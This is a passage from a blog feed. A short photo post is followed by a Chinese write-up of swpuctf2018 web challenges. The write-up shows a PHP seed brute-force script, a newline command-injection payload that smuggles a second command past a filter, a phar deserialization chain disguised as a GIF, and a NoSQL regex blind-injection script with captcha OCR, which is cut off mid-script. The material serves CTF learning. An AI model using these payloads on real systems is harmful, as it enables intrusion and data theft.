    <content type="html"><![CDATA[<p>今年飞了好多次，而且民航终于可以玩手机了，作为飞机窗口位爱好者，拍了不少照片，发在博客记录一下。作为一个喜欢买中午机票的人，不知道为何这么多日落照片[捂脸]</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vxiqtjj22o03k0npe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vfg8q4j22o03k01ky.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vexecwj22o03k01ky.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9x1daqoj22qj3nd1kz.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wk4qj7j22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vhvxkjj22qj3nde82.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9w00rx7j22qj3ndkjm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vk2nm3j22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9w05920j22qj3ndkjm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wrs0ihj22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wg7csgj22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wg56vkj22qj3ndx6q.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wo9vqzj22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wh5ul9j22qj3ndnpe.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9w4r5yjj22qj3ndb2a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vy3nyej22qj3nde82.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9wb2cufj23nd2qjhdu.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vric0ej22o03k0x6p.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vhd2pcj22o03k07wi.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9x3l1tbj22o03k04qr.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9vk5nrhj22o03k0e82.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyq9x0ucukj22o03k0b2b.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyqatpzdzmj22o03k0b2a.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyqatqsdvgj22o03k04qq.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyqau3xpy8j23k02o0e82.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今年飞了好多次，而且民航终于可以玩手机了，作为飞机窗口位爱好者，拍了不少照片，发在博客记录一下。作为一个喜欢买中午机票的人，不知道为何这么多日落照片[捂脸]&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/6701be31gy1fy
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>swpuctf2018</title>
    <link href="https://4f-kira.github.io/2018/12/20/swpuctf2018/"/>
    <id>https://4f-kira.github.io/2018/12/20/swpuctf2018/</id>
    <published>2018-12-20T03:11:03.000Z</published>
    <updated>2018-12-21T03:36:04.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="swpu2018"><a href="#swpu2018" class="headerlink" title="swpu2018"></a>swpu2018</h1><p>年底忙成狗，没什么时间，花了两个晚上的时间，做了一下简单的题目，还有些题目后面继续补。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码 买个 X ?"></a>用优惠码 买个 X ?</h3><p>注册一个账号，然后登陆，会弹出一个15位优惠码，在页面输入提醒优惠码为24位，扫描后发现源码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//生成优惠码</span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//执行命令</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flag字段和某些字符被过滤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 你的输入不正确!</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据源码提示，需要爆破得到随机种子，然后生成24位优惠码，爆破脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;<span class="number">999999999</span>;$x++)&#123;</span><br><span class="line">    mt_srand($x);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($auth == <span class="string">'4d1Sb0qX2fy1FBV'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $x . <span class="string">"\n"</span>;        </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个效率太低，可以用<code>php_mt_seed</code>，首先将字符串还原为数字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">s = <span class="string">'Lnnon15igXPrvif'</span></span><br><span class="line">num = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line"><span class="keyword">if</span> (i&lt;=(<span class="number">15</span>/<span class="number">2</span>)):</span><br><span class="line">num.append(str_rand.index(s[i]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">num.append(str_rand[::<span class="number">-1</span>].index(s[i])+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'./php_mt_seed '</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num[:]:</span><br><span class="line">cmd += <span class="string">'&#123;&#125; &#123;&#125; 0 61 '</span>.format(i,i)</span><br><span class="line"><span class="keyword">print</span> cmd</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># kira @ k1r4 in ~/pwn/swpu/php_mt_seed-4.0 [10:10:38] C:130</span></span><br><span class="line">$ ./php_mt_seed 47 47 0 61 13 13 0 61 13 13 0 61 14 14 0 61 13 13 0 61 27 27 0 61 31 31 0 61</span><br><span class="line">Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62</span><br><span class="line">Version: 3.0.7 to 5.2.0</span><br><span class="line">Found 0, trying 0xfc000000 - 0xffffffff, speed 511.8 Mseeds/s</span><br><span class="line">Version: 5.2.1+</span><br><span class="line">Found 0, trying 0x12000000 - 0x13ffffff, speed 40.4 Mseeds/s</span><br><span class="line">seed = 0x13af8864 = 330270820 (PHP 7.1.0+)</span><br><span class="line">Found 1, trying 0xfe000000 - 0xffffffff, speed 40.3 Mseeds/s</span><br><span class="line">Found 1</span><br></pre></td></tr></table></figure><p>然后根据随机数生成24位的验证码，即可到达命令执行的地方，虽然过滤了不少字符，不过很容易绕过</p><p>最后payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=0.0.0.0%0aca\t /fl\ag</span><br></pre></td></tr></table></figure><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><p><code>file.php</code>可以看查看文件，得到php文件的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>function.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>; </span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>; </span><br><span class="line">    <span class="comment">//mkdir("upload",0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123; </span><br><span class="line">        unlink($filename); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>); </span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]); </span><br><span class="line">    $extension = end($temp); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123; </span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;"; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用<code>phar</code>触发反序列化，触发过程如下：</p><ol><li><code>file_exists($file)</code>触发phar反序列化</li><li>触发<code>class C1e4r</code>的<code>__destruct()</code>，而函数中的<code>echo $this-&gt;test;</code>触发<code>class Show</code>中的<code>__toString()</code></li><li><code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source;</code>由于读取不可访问属性的值时，<code>class Test</code>中 <code>__get()</code> 会被调用。</li><li>最终调用<code>$this-&gt;get($key)</code>获取<code>$this-&gt;params[&#39;source&#39;]</code>的源码</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params[<span class="string">'source'</span>]= <span class="string">'/var/www/html/f1ag.php'</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$f = <span class="keyword">new</span> C1e4r($b);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h3><p>扫描发现<code>info.php</code>发现是使用<code>mangodb</code>，那么可能就是<code>Nosql注入</code></p><p>自动识别验证码+盲注脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvcode</span><span class="params">()</span>:</span></span><br><span class="line">url1 = <span class="string">'http://123.206.213.66:45678/vertify.php'</span></span><br><span class="line">pic = s.get(url1)</span><br><span class="line">p = open(<span class="string">'123.png'</span>,<span class="string">'wb'</span>)</span><br><span class="line">p.write(pic.content)</span><br><span class="line">p.close()</span><br><span class="line">im = Image.open(<span class="string">'123.png'</span>)</span><br><span class="line">vcode = pytesseract.image_to_string(im)</span><br><span class="line"><span class="keyword">return</span> vcode</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">'http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^&#123;&#125;&amp;vertify=&#123;&#125;'</span></span><br><span class="line">pwd = <span class="string">''</span></span><br><span class="line"><span class="comment"># 'username or password incorrect!'</span></span><br><span class="line"><span class="comment"># 'wrong CAPTCHA!'</span></span><br><span class="line"><span class="comment"># 'Nice!But it is not the real passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> string.lowercase:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">vcode = getvcode()</span><br><span class="line">check = s.get(url2.format(pwd+x,vcode))</span><br><span class="line"><span 